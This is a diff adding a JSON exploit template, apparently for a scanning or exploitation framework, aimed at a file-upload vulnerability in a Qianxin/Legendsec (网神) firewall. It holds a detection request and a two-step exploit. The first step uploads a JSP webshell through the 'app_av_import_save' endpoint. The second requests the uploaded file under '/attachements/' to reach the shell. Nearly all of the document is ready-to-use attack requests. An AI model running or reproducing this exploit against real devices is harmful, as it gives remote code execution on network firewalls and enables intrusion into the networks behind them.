@@ -1,0 +1,50 @@
+{
+	"name":"网神防火墙app_av_import_save文件上传漏洞",
+	"tag":"qianxin",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/?g=app_av_import_save",
+		"pocPost":"------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"test.txt\"\r\nContent-Type: text/plain\r\n\r\ntest111\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"__hash__\"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--",
+		"header":{
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+			"Cache-Control":" no-cache",
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate",
+			"Accept-Language":" zh-CN,zh;q=0.9",
+			"Pragma":" no-cache",
+			"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc"
+		},
+    		"status_code":"200",
+		"pattern":"(successfully)"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/?g=app_av_import_save",
+			"expPost":"------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"24k.jsp\"\r\nContent-Type: text/plain\r\n\r\n{{webshell}}\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"__hash__\"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--",
+			"header":{
+				"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"Cache-Control":" no-cache",
+				"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
+				"Connection":" close",
+				"Accept-Encoding":" gzip, deflate",
+				"Accept-Language":" zh-CN,zh;q=0.9",
+				"Pragma":" no-cache",
+				"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc"
+			},
+    			"status_code":"200",
+			"pattern":"(successfully)"
+		},
+		"step2":{
+			"expGet":"/attachements/24k.jsp",
+			"header":{
+				"User-Agent":" Mozilla/5.0",
+				"Connection":" close",
+				"Accept-Encoding":" */*",
+				"Content-Length":" 29"
+			},
+                                            "status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
